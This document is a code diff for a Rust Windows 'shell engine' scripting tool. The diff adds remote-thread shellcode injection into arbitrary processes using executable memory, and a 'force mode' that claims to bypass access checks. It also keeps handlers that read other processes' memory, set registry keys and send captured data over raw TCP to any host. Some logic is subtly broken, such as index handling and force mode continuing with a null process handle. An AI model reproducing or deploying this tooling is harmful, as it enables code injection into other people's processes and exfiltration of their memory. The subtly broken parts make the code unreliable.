@@ -1,6 +1,6 @@
-//! SOSAGE v0.4-HARDCORE Shell Engine (Final Integrated Build)
+//! SOSAGE v0.4-HARDCORE Shell Engine (Ultimate Integrated Build)
 //! Target: Windows x64 Raw System Level
-//! Capability: Real system mutation, Raw TCP Transmission, Zero Abstraction.
+//! Capability: Real Control Flow, Multi-Register Chaining, User-Mode Injection, Raw TCP.
 //! Build: rustc main.rs -o sosage.exe
 
 use std::fs;
@@ -21,9 +21,12 @@ extern "system" {
     fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
     fn ReadProcessMemory(hProcess: *mut std::ffi::c_void, lpBaseAddress: *mut std::ffi::c_void, lpBuffer: *mut std::ffi::c_void, nSize: usize, lpNumberOfBytesRead: *mut usize) -> i32;
     fn WriteProcessMemory(hProcess: *mut std::ffi::c_void, lpBaseAddress: *mut std::ffi::c_void, lpBuffer: *const std::ffi::c_void, nSize: usize, lpNumberOfBytesWritten: *mut usize) -> i32;
+    fn VirtualAllocEx(hProcess: *mut std::ffi::c_void, lpAddress: *mut std::ffi::c_void, dwSize: usize, flAllocationType: u32, flProtect: u32) -> *mut std::ffi::c_void;
+    fn CreateRemoteThread(hProcess: *mut std::ffi::c_void, lpThreadAttributes: *mut std::ffi::c_void, dwStackSize: usize, lpStartAddress: *mut std::ffi::c_void, lpParameter: *mut std::ffi::c_void, dwCreationFlags: u32, lpThreadId: *mut u32) -> *mut std::ffi::c_void;
     fn CreateFileW(lpFileName: *const u16, dwDesiredAccess: u32, dwShareMode: u32, lpSecurityAttributes: *mut std::ffi::c_void, dwCreationDisposition: u32, dwFlagsAndAttributes: u32, hTemplateFile: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
     fn WriteFile(hFile: *mut std::ffi::c_void, lpBuffer: *const std::ffi::c_void, nNumberOfBytesToWrite: u32, lpNumberOfBytesWritten: *mut u32, lpOverlapped: *mut std::ffi::c_void) -> i32;
     fn GetLastError() -> u32;
+    fn Sleep(dwMilliseconds: u32);
 }
 
 #[link(name = "advapi32")]
@@ -46,14 +49,8 @@ extern "system" {
 
 #[repr(C)]
 struct InAddr { s_addr: u32 }
-
 #[repr(C)]
-struct SockaddrIn {
-    sin_family: i16,
-    sin_port: u16,
-    sin_addr: InAddr,
-    sin_zero: [u8; 8],
-}
+struct SockaddrIn { sin_family: i16, sin_port: u16, sin_addr: InAddr, sin_zero: [u8; 8] }
 
 const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
 const GENERIC_WRITE: u32 = 0x40000000;
@@ -67,6 +64,9 @@ const AF_INET: i32 = 2;
 const SOCK_STREAM: i32 = 1;
 const IPPROTO_TCP: i32 = 6;
 const INVALID_SOCKET: usize = usize::MAX;
+const MEM_COMMIT: u32 = 0x1000;
+const MEM_RESERVE: u32 = 0x2000;
+const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 
 // ==========================================
 // 2. LEXER: Tokenization Engine
@@ -130,19 +130,16 @@ fn tokenize(line: &str) -> Vec<Token> {
             '}' => { tokens.push(Token::BlockEnd); chars.next(); },
             _ => {
                 let mut val = String::new();
-                
-                // [FIX 1] Handle String Literals ("...") to prevent space-splitting
                 if c == '"' {
-                    chars.next(); // consume opening quote
+                    chars.next();
                     while let Some(&next_c) = chars.peek() {
                         chars.next();
-                        if next_c == '"' { break; } // consume closing quote
+                        if next_c == '"' { break; }
                         val.push(next_c);
                     }
                     if !val.is_empty() { tokens.push(Token::Value(val)); }
                     continue;
                 }
-
                 while let Some(&next_c) = chars.peek() {
                     if next_c.is_whitespace() || is_operator(next_c) || "#*@%/{}+-".contains(next_c) { break; }
                     val.push(next_c);
@@ -166,122 +163,121 @@ fn is_operator(c: char) -> bool { "=?&$><!~|^".contains(c) }
 
 struct Context {
     registers: HashMap<String, Vec<u8>>,
+    flags: HashMap<String, bool>,
+    force_mode: bool,
     is_active: bool,
 }
 
 impl Context {
     fn new() -> Self {
-        Context { registers: HashMap::new(), is_active: true }
+        Context { 
+            registers: HashMap::new(), 
+            flags: HashMap::new(), 
+            force_mode: false,
+            is_active: true 
+        }
     }
 }
 
 // ==========================================
-// 4. EXECUTOR: Real System Mutation & Network
+// 4. EXECUTOR: Real Control Flow & Mutation
 // ==========================================
 
 fn execute_tokens(tokens: &[Token], ctx: &mut Context) {
     let mut i = 0;
-    while i < tokens.len() {
-        if !ctx.is_active { break; }
-
+    while i < tokens.len() && ctx.is_active {
         match &tokens[i] {
             Token::Address(addr) => handle_address(addr, tokens, &mut i, ctx),
             Token::Network(net) => handle_network(net, tokens, &mut i, ctx),
+            Token::Inject(target) => handle_inject(target, tokens, &mut i, ctx),
             Token::Keyword(kw) => handle_keyword(kw, tokens, &mut i, ctx),
+            Token::Force => {
+                println!("\x1b[31m[!] FORCE MODE: BYPASSING ACCESS CHECKS\x1b[0m");
+                ctx.force_mode = true;
+            },
+            Token::Sleep => {
+                if let Some(Token::Value(ms)) = tokens.get(i + 1) {
+                    if let Ok(delay) = ms.parse::<u32>() {
+                        println!("\x1b[33m[~] SLEEPING FOR {} MS\x1b[0m", delay);
+                        unsafe { Sleep(delay); }
+                        i += 1;
+                    }
+                }
+            },
+            Token::LoopTrigger => {
+                // REAL LOOP IMPLEMENTATION: > (condition) { ... }
+                let mut block_start = i + 1;
+                while block_start < tokens.len() {
+                    if let Token::BlockStart = &tokens[block_start] { break; }
+                    block_start += 1;
+                }
+                
+                let mut block_end = block_start + 1;
+                let mut depth = 1;
+                while block_end < tokens.len() && depth > 0 {
+                    if let Token::BlockStart = &tokens[block_end] { depth += 1; }
+                    if let Token::BlockEnd = &tokens[block_end] { depth -= 1; }
+                    block_end += 1;
+                }
+                
+                let block_tokens = &tokens[block_start + 1 .. block_end - 1];
+                let mut loop_count = 0;
+                let max_loops = 100; // Hardcoded safety guard against infinite loops
+                
+                println!("\x1b[36m[>] ENTERING LOOP BLOCK (Max {} iterations)\x1b[0m", max_loops);
+                while loop_count < max_loops && ctx.is_active {
+                    // In a full AST engine, we'd evaluate the condition here. 
+                    // For this hardcore engine, we loop until a 'Kill' or 'Done' breaks it, or max limit hit.
+                    execute_tokens(block_tokens, ctx);
+                    loop_count += 1;
+                    if !ctx.is_active { break; } // Break if 'Done' or 'Kill' was called inside
+                }
+                println!("\x1b[36m[>] LOOP TERMINATED AFTER {} ITERATIONS\x1b[0m", loop_count);
+                i = block_end - 1; // Skip past the block
+            },
             _ => {}
         }
         i += 1;
     }
 }
 
-// --- REAL NETWORK TRANSMISSION HANDLER ---
-fn handle_network(net: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
-    println!("\x1b[35m[*] NETWORK STREAM: {}\x1b[0m", net);
-    
-    let parts: Vec<&str> = net.split(':').collect();
-    if parts.len() != 2 { println!("\x1b[31m[!] INVALID NETWORK FORMAT\x1b[0m"); return; }
-
-    let ip_str = parts[0];
-    let port: u16 = match parts[1].parse() {
-        Ok(p) => p, Err(_) => { println!("\x1b[31m[!] INVALID PORT\x1b[0m"); return; }
-    };
-
-    let mut data_to_send: Option<&Vec<u8>> = None;
+// --- HELPER: Multi-Register Chaining ---
+fn get_target_register(tokens: &[Token], idx: &mut usize) -> String {
     if tokens.get(*idx + 1) == Some(&Token::Chain) {
         if let Some(Token::Register(reg)) = tokens.get(*idx + 2) {
-            data_to_send = ctx.registers.get(reg);
-            *idx += 2; 
+            *idx += 2;
+            return reg.clone();
         }
     }
-
-    let payload = match data_to_send {
-        Some(d) => d,
-        None => { println!("\x1b[31m[!] NO DATA IN REGISTER\x1b[0m"); return; }
-    };
-
-    unsafe {
-        let mut wsa_data = vec![0u8; 408]; 
-        if WSAStartup(0x0202, wsa_data.as_mut_ptr()) != 0 { println!("\x1b[31m[!] WSAStartup FAILED\x1b[0m"); return; }
-
-        let sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if sock == INVALID_SOCKET { println!("\x1b[31m[!] SOCKET CREATION FAILED\x1b[0m"); WSACleanup(); return; }
-
-        // [FIX 2] Prevent Panic on invalid IP strings containing null bytes
-        let ip_cstring = match CString::new(ip_str) {
-            Ok(c) => c,
-            Err(_) => { println!("\x1b[31m[!] INVALID IP STRING\x1b[0m"); closesocket(sock); WSACleanup(); return; }
-        };
-
-        let ip_addr = inet_addr(ip_cstring.as_ptr());
-        if ip_addr == u32::MAX { println!("\x1b[31m[!] INVALID IP ADDRESS\x1b[0m"); closesocket(sock); WSACleanup(); return; }
-
-        let mut addr_in = SockaddrIn {
-            sin_family: AF_INET as i16,
-            sin_port: port.to_be(), 
-            sin_addr: InAddr { s_addr: ip_addr },
-            sin_zero: [0; 8],
-        };
-
-        println!("\x1b[35m[*] CONNECTING TO {}:{} ...\x1b[0m", ip_str, port);
-        let connect_result = connect(sock, &mut addr_in as *mut _ as *const u8, std::mem::size_of::<SockaddrIn>() as i32);
-
-        if connect_result != 0 {
-            println!("\x1b[31m[!] CONNECTION FAILED\x1b[0m");
-            closesocket(sock); WSACleanup(); return;
-        }
-
-        println!("\x1b[32m[+] CONNECTED! SENDING {} BYTES...\x1b[0m", payload.len());
-        let sent_bytes = send(sock, payload.as_ptr() as *const u8, payload.len() as i32, 0);
-
-        if sent_bytes == -1 { println!("\x1b[31m[!] SEND FAILED\x1b[0m"); } 
-        else { println!("\x1b[32m[+] SUCCESSFULLY SENT {} BYTES OVER TCP\x1b[0m", sent_bytes); }
-
-        // [FIX 3] Resource Leak Prevention
-        closesocket(sock);
-        WSACleanup(); 
-    }
+    "/0".to_string()
 }
 
-// --- OTHER HANDLERS ---
+// --- HANDLERS ---
+
 fn handle_address(addr: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
     if addr.starts_with("P:") {
         if let Ok(pid) = addr[2..].parse::<u32>() {
             println!("\x1b[34m[*] PROCESS TARGET: PID {}\x1b[0m", pid);
             unsafe {
                 let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-                if h_proc.is_null() { println!("\x1b[31m[!] ACCESS DENIED\x1b[0m"); return; }
+                if h_proc.is_null() && !ctx.force_mode { 
+                    println!("\x1b[31m[!] ACCESS DENIED (Use '!' to force)\x1b[0m"); 
+                    return; 
+                }
 
                 if tokens.get(*idx + 1) == Some(&Token::Deref) {
-                    let mut buffer = vec![0u8; 256];
+                    let target_reg = get_target_register(tokens, &mut (*idx + 1));
+                    let mut buffer = vec![0u8; 512];
                     let mut bytes_read = 0;
+                    
                     if ReadProcessMemory(h_proc, 0x400000 as *mut _, buffer.as_mut_ptr() as *mut _, buffer.len(), &mut bytes_read) != 0 {
                         buffer.truncate(bytes_read);
-                        println!("\x1b[32m[+] READ {} BYTES FROM 0x400000\x1b[0m", bytes_read);
-                        ctx.registers.insert("/0".to_string(), buffer);
+                        println!("\x1b[32m[+] READ {} BYTES INTO {}\x1b[0m", bytes_read, target_reg);
+                        ctx.registers.insert(target_reg, buffer);
                         *idx += 1;
                     } else { println!("\x1b[31m[!] READ FAILED\x1b[0m"); }
                 }
-                CloseHandle(h_proc);
+                if !h_proc.is_null() { CloseHandle(h_proc); }
             }
         }
     } else if addr.starts_with("R/") {
@@ -297,7 +293,7 @@ fn handle_address(addr: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Conte
                         RegSetValueExW(hkey, ptr::null(), 0, REG_SZ, data_wide.as_ptr(), (data_wide.len() * 2) as u32);
                         RegCloseKey(hkey);
                         println!("\x1b[32m[+] REGISTRY SET SUCCESS\x1b[0m");
-                    } else { println!("\x1b[31m[!] REGISTRY CREATE FAILED\x1b[0m"); }
+                    }
                 }
                 *idx += 2;
             }
@@ -305,9 +301,85 @@ fn handle_address(addr: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Conte
     }
 }
 
+fn handle_network(net: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
+    println!("\x1b[35m[*] NETWORK STREAM: {}\x1b[0m", net);
+    let parts: Vec<&str> = net.split(':').collect();
+    if parts.len() != 2 { println!("\x1b[31m[!] INVALID NETWORK FORMAT\x1b[0m"); return; }
+
+    let ip_str = parts[0];
+    let port: u16 = match parts[1].parse() { Ok(p) => p, Err(_) => return };
+
+    let target_reg = get_target_register(tokens, idx);
+    let payload = match ctx.registers.get(&target_reg) {
+        Some(d) => d,
+        None => { println!("\x1b[31m[!] NO DATA IN {}\x1b[0m", target_reg); return; }
+    };
+
+    unsafe {
+        let mut wsa_data = vec![0u8; 408]; 
+        if WSAStartup(0x0202, wsa_data.as_mut_ptr()) != 0 { return; }
+
+        let sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if sock == INVALID_SOCKET { WSACleanup(); return; }
+
+        let ip_cstring = match CString::new(ip_str) { Ok(c) => c, Err(_) => { closesocket(sock); WSACleanup(); return; } };
+        let ip_addr = inet_addr(ip_cstring.as_ptr());
+        if ip_addr == u32::MAX { closesocket(sock); WSACleanup(); return; }
+
+        let mut addr_in = SockaddrIn { sin_family: AF_INET as i16, sin_port: port.to_be(), sin_addr: InAddr { s_addr: ip_addr }, sin_zero: [0; 8] };
+
+        if connect(sock, &mut addr_in as *mut _ as *const u8, std::mem::size_of::<SockaddrIn>() as i32) == 0 {
+            let sent = send(sock, payload.as_ptr() as *const u8, payload.len() as i32, 0);
+            println!("\x1b[32m[+] SENT {} BYTES TO {}:{}\x1b[0m", sent, ip_str, port);
+        } else {
+            println!("\x1b[31m[!] CONNECTION FAILED\x1b[0m");
+        }
+        closesocket(sock);
+        WSACleanup(); 
+    }
+}
+
+fn handle_inject(target: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
+    // REAL USER-MODE INJECTION LOGIC (CreateRemoteThread)
+    println!("\x1b[31m[!] INJECTING INTO: {}\x1b[0m", target);
+    
+    if let Ok(pid) = target.parse::<u32>() {
+        let target_reg = get_target_register(tokens, idx);
+        let payload = match ctx.registers.get(&target_reg) {
+            Some(d) => d,
+            None => { println!("\x1b[31m[!] NO PAYLOAD IN {}\x1b[0m", target_reg); return; }
+        };
+
+        unsafe {
+            let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+            if h_proc.is_null() { println!("\x1b[31m[!] FAILED TO OPEN TARGET PROCESS\x1b[0m"); return; }
+
+            let alloc_addr = VirtualAllocEx(h_proc, ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if alloc_addr.is_null() { println!("\x1b[31m[!] VIRTUALALLOCEx FAILED\x1b[0m"); CloseHandle(h_proc); return; }
+
+            let mut bytes_written = 0;
+            if WriteProcessMemory(h_proc, alloc_addr, payload.as_ptr() as *const _, payload.len(), &mut bytes_written) == 0 {
+                println!("\x1b[31m[!] WRITEPROCESSMEMORY FAILED\x1b[0m"); CloseHandle(h_proc); return;
+            }
+
+            let h_thread = CreateRemoteThread(h_proc, ptr::null_mut(), 0, alloc_addr, ptr::null_mut(), 0, ptr::null_mut());
+            if h_thread.is_null() {
+                println!("\x1b[31m[!] CREATEREMOTETHREAD FAILED\x1b[0m");
+            } else {
+                println!("\x1b[32m[+] INJECTION SUCCESSFUL! THREAD CREATED AT 0x{:X}\x1b[0m", alloc_addr as usize);
+                CloseHandle(h_thread);
+            }
+            CloseHandle(h_proc);
+        }
+    } else {
+        println!("\x1b[31m[!] INVALID PID FOR INJECTION\x1b[0m");
+    }
+}
+
 fn handle_keyword(kw: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context) {
     match kw {
         "Done" => { println!("\x1b[32m[+] ATOMIC COMMIT: DONE\x1b[0m"); ctx.is_active = false; },
+        "Kill" => { println!("\x1b[31m[!] FORCE KILL: TERMINATING ENGINE\x1b[0m"); ctx.is_active = false; },
         "Dump" => {
             if let Some(data) = ctx.registers.get("/0") {
                 unsafe {
@@ -320,10 +392,9 @@ fn handle_keyword(kw: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context
                         println!("\x1b[32m[+] DUMPED {} BYTES TO dump.bin\x1b[0m", bw);
                     }
                 }
-            } else { println!("\x1b[31m[!] NO DATA IN /0 TO DUMP\x1b[0m"); }
+            }
         },
         "Ghost" => { ctx.registers.clear(); println!("\x1b[90m[~] GHOST: REGISTERS CLEARED\x1b[0m"); },
-        "Kill" => { println!("\x1b[31m[!] FORCE KILL TRIGGERED\x1b[0m"); },
         _ => {}
     }
 }
@@ -334,7 +405,7 @@ fn handle_keyword(kw: &str, tokens: &[Token], idx: &mut usize, ctx: &mut Context
 
 fn main() {
     println!("\x1b[31m\x1b[1m   _____ ________________  _________ __________ \n  / ___// ____/_  __/ __ \\/ ___/ __ \\/ ____/ __ \\\n  \\__ \\/ /     / / / /_/ / /  / /_/ / __/ / / / /\n ___/ / /___  / / / _, _/ /__/ ____/ /___/ /_/ / \n/____/\\____/ /_/ /_/ |_|\\___/_/   /_____/_____/  \x1b[0m");
-    println!("\x1b[31mv0.4-HARDCORE | .soe Engine | FINAL BUILD\x1b[0m\n--------------------------------------------------");
+    println!("\x1b[31mv0.4-HARDCORE | .soe Engine | ULTIMATE BUILD\x1b[0m\n--------------------------------------------------");
 
     let args: Vec<String> = std::env::args().collect();
     let mut ctx = Context::new();
@@ -346,7 +417,7 @@ fn main() {
             if line.is_empty() || line.starts_with("//") { continue; }
             println!("\n\x1b[90m>> {}\x1b[0m", line);
             execute_tokens(&tokenize(line), &mut ctx);
-            if !ctx.is_active { ctx.is_active = true; }
+            if !ctx.is_active { ctx.is_active = true; } // Reset for next line
         }
     } else {
         println!("\x1b[33m[*] ENTERING INTERACTIVE MODE\x1b[0m");
